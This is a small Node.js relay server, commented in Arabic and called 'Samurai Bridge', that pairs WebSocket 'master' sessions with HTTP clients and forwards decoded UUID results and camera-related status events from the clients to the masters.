const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
// السماح بطلبات من جميع النطاقات (CORS)
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// خريطة لتخزين اتصالات الماستر النشطة (session_id -> WebSocket)
const activeMasters = new Map();

// --- 1. قسم الماستر (WebSocket) ---
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            // عندما يرسل الماستر طلب تسجيل الجلسة
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                activeMasters.set(data.session_id, ws);
                console.log(`[MASTER LINKED] Session ID: ${data.session_id}`);

                // تنظيف الاتصال عند خروج الماستر
                ws.on('close', () => {
                    activeMasters.delete(data.session_id);
                    console.log(`[MASTER DISCONNECTED] Session ID: ${data.session_id}`);
                });
            }
        } catch (err) {
            console.error('WebSocket parsing error:', err);
        }
    });
});

// --- 2. قسم العميل (HTTP POST) ---
app.post('/', (req, res) => {
    const { session_id, type, payload, reason } = req.body;

    if (!session_id) {
        return res.status(400).json({ success: false, error: 'Missing session_id' });
    }

    // البحث عن الماستر المرتبط بهذه الجلسة
    const masterWs = activeMasters.get(session_id);
    const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;

    // الحالة أ: العميل أرسل النتيجة النهائية المشفرة (UUID)
    if (payload) {
        try {
            // فك التشفير (Base64) واستخراج الـ UUID
            const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
            const parsedPayload = JSON.parse(decodedStr);
            const uuid = parsedPayload.result;

            if (isMasterConnected) {
                masterWs.send(JSON.stringify({
                    type: 'UUID_RECEIVED',
                    uuid: uuid
                }));
            }
            console.log(`[SUCCESS] UUID received and forwarded for session: ${session_id}`);
            return res.json({ success: true }); // الرد على العميل بالنجاح
        } catch (err) {
            console.error('Payload decoding error:', err);
            return res.status(500).json({ success: false, error: 'Invalid payload formatting' });
        }
    }

    // الحالة ب: العميل يرسل خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
    if (type) {
        if (isMasterConnected) {
            masterWs.send(JSON.stringify({
                type: type,
                reason: reason || null
            }));
        }
        return res.json({ success: true });
    }

    return res.status(400).json({ success: false, error: 'Invalid request body' });
});

// مسار تجريبي للتأكد من أن السيرفر يعمل
app.get('/', (req, res) => {
    res.send('SAMURAI BRIDGE SERVER IS ONLINE 🚀');
});

// تشغيل السيرفر
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`[SERVER] Samurai Bridge listening on port ${PORT}`);
});
